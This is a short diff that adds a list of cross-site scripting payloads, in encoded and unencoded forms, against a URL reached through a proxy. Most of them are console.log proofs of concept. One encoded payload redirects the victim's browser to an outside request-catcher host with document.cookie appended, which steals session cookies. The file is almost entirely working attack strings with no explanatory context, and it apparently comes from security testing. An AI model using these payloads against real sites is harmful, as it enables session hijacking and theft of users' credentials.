@@ -1,0 +1,11 @@
+encoded payload :
+http://proxy/hello<script src="/%250d;console.log(1)%252F%252F"></script>
+http://proxy/hello%3Cscript%20src=%22/%250d;window.location.href%253D%2522https://hellyeah.requestcatcher.com/%2522%252Bdocument.cookie;%252F%252F%22%3E%3C/script%3E
+
+unencoded payload : 
+1st
+http://proxy/hello<scriptsrc="/%0d;console.log(1)%2F%2F"></script>
+
+2nd
+http://proxy/hello<scriptsrc="/
+;console.log(1)//"></script>
